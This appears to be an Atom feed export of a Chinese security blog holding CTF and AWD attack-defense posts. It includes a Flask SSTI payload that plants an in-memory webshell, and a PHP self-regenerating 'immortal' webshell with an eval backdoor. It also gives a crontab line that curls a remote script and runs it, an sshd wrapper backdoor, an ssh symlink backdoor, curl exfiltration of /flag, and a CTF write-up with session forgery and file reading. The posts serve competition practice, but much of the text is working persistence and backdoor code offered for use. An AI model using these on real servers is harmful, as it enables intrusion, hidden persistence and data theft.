:__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read())&quot;,&#123;&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]&#125;)&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/1631718243223q0ni26nb.png?imageslim" alt="paste image"><br>Above figure shows that a webshell was generated in memory and can be visited via route /shell while pass paramater cmd to execute the system command,default command are whoami.</p><h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>In this passage I just show how to use it , but I think the critical problem is analyse the execute logic and try to find some way to fix? or exploit it in a new way:)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;Server-side Template Injection</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>AWD新手的不死马及权限维持思路</title>
    <link href="https://polosec.github.io/2021/05/29/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC/"/>
    <id>https://polosec.github.io/2021/05/29/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC/</id>
    <published>2021-05-29T02:42:40.000Z</published>
    <updated>2021-05-29T04:08:31.726Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>参考链接<br><a href="https://jlkl.github.io/2019/02/08/Web_13/">https://jlkl.github.io/2019/02/08/Web_13/</a><br><a href="https://rmb122.com/2019/04/04/%E5%B9%B2%E6%8E%89-PHP-%E4%B8%8D%E6%AD%BB%E9%A9%AC/">https://rmb122.com/2019/04/04/%E5%B9%B2%E6%8E%89-PHP-%E4%B8%8D%E6%AD%BB%E9%A9%AC/</a><br><a href="https://www.cnblogs.com/Cl0ud/p/13620537.html">https://www.cnblogs.com/Cl0ud/p/13620537.html</a><br><a href="https://zhuanlan.zhihu.com/p/88850561">https://zhuanlan.zhihu.com/p/88850561</a></p></blockquote><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>不死马指的是入到内存的webshell，在PHP中可以使用ulink删除自身文件并循环创建webshell。</p><h1 id="不死马利用流程"><a href="#不死马利用流程" class="headerlink" title="不死马利用流程"></a>不死马利用流程</h1><p>首先根据web后门或者任何挖掘出来的漏洞尝试执行系统命令（如遗留的web后门等），通过该类漏洞成功执行写入不死马的系统命令并执行该不死马。比如通过内置的后门直接system(“echo 不死马脚本内容 &gt;/var/www/html;php 不死马文件名.php”)。这样就会在该目录下不断生成一个不死马 比如.3.php。通过webshell管理工具或者使用Python写脚本批量访问去getflag。</p><h1 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h1><p>这里偷个别的师傅的图先<br><img src="http://cdn.polowong.top/1622256277454oiqbb65p.png?imageslim" alt="paste image">不死马一般长这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    ignore_user_abort(true);&#x2F;&#x2F;设置与客户机断开是否会终止脚本的执行，这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。</span><br><span class="line">    set_time_limit(0);</span><br><span class="line">    unlink(__FILE__);</span><br><span class="line">    $file &#x3D; &#39;.3.php&#39;;</span><br><span class="line">    $code &#x3D; &#39;&lt;?php if(md5($_GET[&quot;pass&quot;])&#x3D;&#x3D;&quot;1a1dc91c907325c69271ddf0c944bc72&quot;)&#123;@eval($_POST[a]);&#125; ?&gt;&#39;;</span><br><span class="line">    &#x2F;&#x2F;pass&#x3D;pass</span><br><span class="line">    while (1)&#123;</span><br><span class="line">        file_put_contents($file,$code);</span><br><span class="line">        system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; .3.php&#39;);</span><br><span class="line">        usleep(0);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>该不死马不断生成.3.php，通过访问<a href="http://localhost/.3.php?pass=pass">http://localhost/.3.php?pass=pass</a>  然后POST a=system(“想要执行的系统命令”);即可通过不死马实现命令执行。这里使用MD5是因为防止别人骑着自己的马进去了，MD5理论上不可逆。如果使用python批量getshell的话大体思路就是</p><p>url=<a href="http://localhost/.3.php?pass=pass">http://localhost/.3.php?pass=pass</a><br>data={“a”:”system(&quot;cat /flag&quot;);”}<br>flag=requests.post(url=url,data=data).text然后url变变就可以，一般会维护一个地址池 从地址池里面取url或者取特征（可能某个url字段不一样）直接打就行，再配合提交flag的api就可以实现自动getflag。</p><h1 id="不死马删除"><a href="#不死马删除" class="headerlink" title="不死马删除"></a>不死马删除</h1><p>这里不死马删除有几个思路<br>1.shell脚本直接删除不死马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">while :</span><br><span class="line">do</span><br><span class="line">rm -rf .3.php;</span><br><span class="line">echo &quot;remove success&quot;;</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>这里其实可以更完善一些，比如挂上while自动检测新增的文件 或者配合文件监控脚本实现新增之后直接调用函数删除新增的文件等等（Python实现，我不会shell）<br>2.PHP服务重启（awd环境可能不允许，因为权限较低）<br>service apache2 restart<br>service php restart</p><p>3.杀低权限PHP进程<br>php-apache:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">system(&quot;kill &#96;ps -ef | grep httpd | grep -v grep | awk &#39;&#123;print $2&#125;&#39;&#96;&quot;);</span><br></pre></td></tr></table></figure><p>php-fpm:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">system(&quot;kill &#96;ps -ef | grep php-fpm | grep -v grep | awk &#39;&#123;print $2&#125;&#39;&#96;&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="awd权限维持"><a href="#awd权限维持" class="headerlink" title="awd权限维持"></a>awd权限维持</h1><p>AWD的权限维持其实和普通的权限维持差不多常用的大概有 crontab ssh软连接 sshwrapper。<br>详情参考<a href="https://xz.aliyun.com/t/7338%E7%BB%86%E7%9C%8B%E4%BA%86%E4%B8%8B%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0">https://xz.aliyun.com/t/7338细看了下这篇文章</a> 发现了一个隐藏一句话的方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;&lt;?&#x3D;\&#96;\$_POST[cmd]\&#96;?&gt;\r&lt;?&#x3D;&#39;System default page.&#39;;?&gt;&quot; &gt;default.php</span><br></pre></td></tr></table></figure><p>crontab添加计划任务自动写不死马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * curl http:&#x2F;&#x2F;host&#x2F;sh.sh &gt;&#x2F;tmp&#x2F;.tmp&#x2F;1.sh;chmod u+x &#x2F;tmp&#x2F;.tmp&#x2F;1.sh ; &#x2F;tmp&#x2F;.tmp&#x2F;1.sh</span><br></pre></td></tr></table></figure><p>本地起一个http服务 放上一个sh.sh脚本，里面写了创建php不死马的命令。<br>下面两种暂时利用失败 可能是腾讯云的原因。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ssh wrapper</span><br><span class="line">cd &#x2F;usr&#x2F;sbin&#x2F;</span><br><span class="line">mv sshd ..&#x2F;bin&#x2F;</span><br><span class="line">echo &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt;sshd</span><br><span class="line">echo &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if(getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshd</span><br><span class="line">echo &#39;exec&#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;sshd restart</span><br><span class="line">exp:</span><br><span class="line">socat STDIO TCP4:target_ip:22,sourceport&#x3D;13377</span><br><span class="line">ssh软连接</span><br><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su; &#x2F;tmp&#x2F;su -oPort&#x3D;5555;</span><br><span class="line">建立一个软连接，然后通过5555端口访问ssh服务</span><br></pre></td></tr></table></figure><p>还有一种操作就是curl外带本地命令执行结果,这个也可以写到crontab里面，比较方便的使用提交flag的api提交flag。示例如下</p><p>curl “http://:7777?flag=$(cat /flag)”</p><h1 id="一些小技巧"><a href="#一些小技巧" class="headerlink" title="一些小技巧"></a>一些小技巧</h1><p>用来迷惑对手</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alias crontab&#x3D;&quot;echo no crontab for &#96;whoami&#96; ||&quot;</span><br><span class="line">alias cat&#x3D;&quot;echo &#96;date&#96;|md5sum|cut -d &#39; &#39; -f1||&quot;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;参考链接&lt;br&gt;&lt;a href=&quot;https://jlkl.github.io/2019/02/08/Web_13/&quot;&gt;https://jlkl.github.io/2019/02/08/Web_13/&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https:</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>安网杯部分wp</title>
    <link href="https://polosec.github.io/2021/05/12/%E5%AE%89%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86wp/"/>
    <id>https://polosec.github.io/2021/05/12/%E5%AE%89%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86wp/</id>
    <published>2021-05-12T09:57:42.000Z</published>
    <updated>2021-05-14T15:54:34.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>webshell上传</p><p>前端绕过。绕了半天才想起来是前端绕过。。burp改个后缀就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">代码</span><br><span class="line">function checkFile() &#123;</span><br><span class="line">    var file &#x3D; document.getElementsByName(&#39;upload_file&#39;)[0].value;</span><br><span class="line">    if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line">        alert(&quot;请选择要上传的文件!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;定义允许上传的文件类型</span><br><span class="line">    var allow_ext &#x3D; &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">    &#x2F;&#x2F;提取上传文件的类型</span><br><span class="line">    var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">    &#x2F;&#x2F;判断上传文件类型是否允许上传</span><br><span class="line">    if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123;</span><br><span class="line">        var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拿到shell 蚁剑上传 cat /flag</p><h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p><a href="http://172.20.2.4:9003/index.php?txt=../../../flag">http://172.20.2.4:9003/index.php?txt=../../../flag</a> 任意文件读取，秒了</p><h1 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h1><p>知识点：SSTI,SSTI读配置文件，/proc目录的作用，flask session伪造</p><p>首先，尝试登录172.20.2.3:9006,登录失败，访问了一下robots.txt,发现了有报错信息，观察URL，考虑可能存在XSS，</p><p>image-20210511155722690.png<img src="http://cdn.polowong.top/1620813539140l7b6j4e6.png?imageslim" alt="paste image"><br>这里看了一眼中间件分析结果，发现了flask。。flask人狂喜（。</p><p>直接4</p><p>image-20210511155809022.png<img src="http://cdn.polowong.top/1620813548564ty2uanbr.png?imageslim" alt="paste image"><br>懂得都懂，铁ssti了，尝试一步步rce，检测发现没开debug模式，所以只能走常规的rce利用了。</p><p>当尝试到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[-1].__subclasses__()</span><br></pre></td></tr></table></figure><p>时发现被ban了，单独测试了下小括号，发现是ban了小括号。既然ban了小括号，那么常规的ssti rce基本就走不通了。只能考虑读取一些敏感文件，比如config，使用payload  读取config文件，发现了 secret_key</p><p>image-20210511160014837.png<img src="http://cdn.polowong.top/16208135773438gjedayy.png?imageslim" alt="paste image"></p><p>secret_key的作用是生成session，具体步骤我忘了，反正是根据secret_key可以还原和生成对应的session。</p><p>github有对应的工具，flask session manager。</p><p>接下来看了看源码，<br>image-20210511160246157.png<img src="http://cdn.polowong.top/1620813563588zor9il2b.png?imageslim" alt="paste image"></p><p>一个简单的前端验证，burp抓返回包把0改成1就行，这样就顺利进入后台了。但是进入后台后提示我不是admin（2333</p><p>image-20210511160330889.png<img src="http://cdn.polowong.top/16208136016557e3ok72r.png?imageslim" alt="paste image"></p><p>好吧，看起来是要伪造admin的session了。现在secret_key有了，用工具先解密当前session，把用户名改成admin后再生成session。如下图所示</p><p>image-20210511160731351.png<img src="http://cdn.polowong.top/1620813610364ajp4gund.png?imageslim" alt="paste image"></p><p>那么当前生成的admin的session就是eyJ1c2VybmFtZSI6ImFkbWluIn0.YJo7Og.7WfYqubO5M7KZ-8IXXKIp6kMf5o，edit this cookie 换一下（我这chrome有bug，用的firefox）</p><p>image-20210511160841881.png<img src="http://cdn.polowong.top/16208136158740qcqf1gf.png?imageslim" alt="paste image"></p><p>已经给了hint，考虑任意文件读取，首先尝试读取/etc/passwd，成功。</p><p>image-20210511161046827.png<img src="http://cdn.polowong.top/16208136213232flk4by2.png?imageslim" alt="paste image"></p><p>接下来尝试读flag。直接/flag不行，关键字给过滤了。卡了好几个小时</p><p>用了挺多绕过方法 /fla? /f* 等等 但是可能中间有转义之类的，最终传到Linux层并不能识别通配符，所以卡了很长时间</p><p>最后的思路是之前比赛中读flag，过滤了很多，师傅告诉我利用/proc/目录读文件，proc目录代表了与当前运行进程有关的信息并以文件的形式展示（学习链接：<a href="https://blog.csdn.net/qq_45521281/article/details/114594402%EF%BC%89%EF%BC%8C%E8%80%8C/proc/self%E7%9B%AE%E5%BD%95%E4%BB%A3%E8%A1%A8%E4%BA%86%E5%BD%93%E5%89%8D%E8%BF%9B%E7%A8%8B%E7%9A%84%E6%9C%89%E5%85%B3%E4%BF%A1%E6%81%AF%E5%B9%B6%E4%BB%A5%E6%96%87%E4%BB%B6%E7%9A%84%E5%BD%A2%E5%BC%8F%E5%B1%95%E7%A4%BA%EF%BC%8C%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E6%9C%89fd%E3%80%81cmdline%E3%80%81cwd%E3%80%81envrion%E7%AD%89%E3%80%82">https://blog.csdn.net/qq_45521281/article/details/114594402），而/proc/self目录代表了当前进程的有关信息并以文件的形式展示，需要注意的有fd、cmdline、cwd、envrion等。</a></p><p>/proc/self/cmdline 代表当前的命令行输入内容，我读取了之后是这个</p><p>image-20210511161330178.png<img src="http://cdn.polowong.top/1620813626597i04733zp.png?imageslim" alt="paste image"></p><p>好家伙 绝对路径有了，直接读文件</p><p>/app/app_a384gh1.py</p><p>程序代码如下，基本修复了ssti-&gt;rce，然后看到了import  ffffffff111llllag 文件，那直接读当前/app目录下的ffffffff111llllag.py就好了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template_string,redirect,render_template,session</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ffffffff111llllag</span><br><span class="line"></span><br><span class="line">app = Flask(import_name=__name__,template_folder=<span class="string">&#x27;templates&#x27;</span>,static_folder=<span class="string">&#x27;static&#x27;</span>,static_url_path=<span class="string">&#x27;/static&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] =<span class="string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">before_request</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;/admin/&#x27;</span> <span class="keyword">in</span> request.path:</span><br><span class="line">        sess_name=<span class="string">&#x27;guest&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(session)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">            sess_name=session[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> sess_name!=<span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Your current account is &#x27;</span>+sess_name+<span class="string">&#x27; not admin&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makeheader</span>(<span class="params">response</span>):</span></span><br><span class="line">    response.headers[<span class="string">&quot;X-Powered-By&quot;</span>] = <span class="string">&quot;PHP/7.2.10&quot;</span></span><br><span class="line">    response.headers[<span class="string">&quot;Hint&quot;</span>] = <span class="string">&quot;Wake up Neo, the Matrix has you&quot;</span></span><br><span class="line">    response.headers[<span class="string">&#x27;Server&#x27;</span>]=<span class="string">&#x27;Apache/2.4.35 (Win64) PHP/7.2.10&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redirect_2_index</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;not in session!&#x27;</span>)</span><br><span class="line">        session[<span class="string">&#x27;username&#x27;</span>]=<span class="string">&#x27;guest&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;./index.php&quot;</span>, code=<span class="number">302</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/err.php&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">err</span>():</span></span><br><span class="line">    <span class="comment">#I patched the SSTI vulnerability.How clever I am!</span></span><br><span class="line">    errorinfo=request.args.get(<span class="string">&quot;errorinfo&quot;</span>)</span><br><span class="line">    blacklist=[<span class="string">&quot;(&quot;</span>,<span class="string">&quot;)&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> errorinfo:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;You&#x27;re just a dirty hacker,aren&#x27;t you?&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;Oh no,there is an Error! Error info:&lt;p&gt; %s&quot;</span> % errorinfo)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/index.php&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login.php&quot;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    username=request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#x27;&quot;</span> <span class="keyword">in</span> username <span class="keyword">or</span> <span class="string">&quot;&#x27;&quot;</span> <span class="keyword">in</span> password:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin/backendmanage.php&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backendmanage</span>():</span></span><br><span class="line">    img=request.args.get(<span class="string">&quot;img&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> img:</span><br><span class="line">        img=<span class="string">&#x27;1.png&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> img:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You&#x27;re just a dirty hacker,aren&#x27;t you?&quot;</span></span><br><span class="line">    content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(img, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> img_f:</span><br><span class="line">        content = img_f.read()</span><br><span class="line">        content = base64.b64encode(content)</span><br><span class="line">    content=<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> content])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;Current Image:&#123;img&#125;&lt;/h1&gt;&lt;!-- ?img=1.png --&gt;&lt;img  src=&quot;data:;base64,&#123;content&#125;&quot;&gt;&#x27;</span>.<span class="built_in">format</span>(img=img,content=content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params">Exception</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">all_exception_handler</span>(<span class="params">e</span>):</span></span><br><span class="line">    e=<span class="built_in">str</span>(e)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/err.php?errorinfo=&quot;</span>+e, code=<span class="number">302</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>读取flag文件后，拿到flag。</p><p>image-20210511161628308.png<img src="http://cdn.polowong.top/1620813641263aqv49hf6.png?imageslim" alt="paste image"></p><p>这题有几个坑点，首先是HTTP头里面的PHP HEADER 容易迷惑人，其次是登录那的sql注入容易迷惑人，最后是FLASK-SSTI的利用方式需要掌握全面：</p><p>1.直接RCE</p><p>2.开DEBUG时，SSTI 读文件-&gt;构造PIN码-&gt;RCE</p><p>3.伪造session登录</p><h1 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h1><p>流量包没看出来啥，直接分离http对象发现了flag.php，压缩包被破坏了，修复下头</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">JPEG (jpg)，                        　　文件头：FFD8FF　　　　　　　　　　　　　　　　　　　　　　　 文件尾：FF D9　　　　　　　　　　　　　　　</span><br><span class="line">PNG (png)，                       　　 文件头：89504E47　　　　　　　　　　　　　　　　　　　　　　文件尾：AE 42 60 82</span><br><span class="line">GIF (gif)，                           　　文件头：47494638　　　　　　　　　　　　　　　　　　　　　　文件尾：00 3B                                                                 ZIP Archive (zip)，                     文件头：504B0304　　　　　　　　　　　　　　　　　　　　　　文件尾：50 4B</span><br><span class="line"></span><br><span class="line">TIFF (tif)，                           　  文件头：49492A00　　　　　　　　　　　　　　　　　　　　　　文件尾：</span><br><span class="line">Windows Bitmap (bmp)，      　  文件头：424D　　　　　　　　　　　　　　　　　　　　　　　　 文件尾：</span><br><span class="line">CAD (dwg)，                        　  文件头：41433130　　　　　　　　　　　　　　　　　　　　　　文件尾：</span><br><span class="line">Adobe Photoshop (psd)，          文件头：38425053　　　　　　　　　　　　　　　　　　　　　　文件尾：</span><br><span class="line">Rich Text Format (rtf)，             文件头：7B5C727466　　　　　　　　　　　　　　　　　　　　  文件尾：</span><br><span class="line">XML (xml)，                              文件头：3C3F786D6C　　　　　　　　　　　　　　　　　　　　 文件尾：</span><br><span class="line">HTML (html)，                           文件头：68746D6C3E</span><br><span class="line">Email [thorough only] (eml)，     文件头：44656C69766572792D646174653A</span><br><span class="line">Outlook Express (dbx)，            文件头：CFAD12FEC5FD746F</span><br><span class="line">Outlook (pst)，                         文件头：2142444E</span><br><span class="line">MS Word&#x2F;Excel (xls.or.doc)，      文件头：D0CF11E0</span><br><span class="line">MS Access (mdb)，                    文件头：5374616E64617264204A</span><br><span class="line">WordPerfect (wpd)，                  文件头：FF575043</span><br><span class="line">Adobe Acrobat (pdf)，               文件头：255044462D312E</span><br><span class="line">Quicken (qdf)，                         文件头：AC9EBD8F</span><br><span class="line">Windows Password (pwl)，         文件头：E3828596</span><br><span 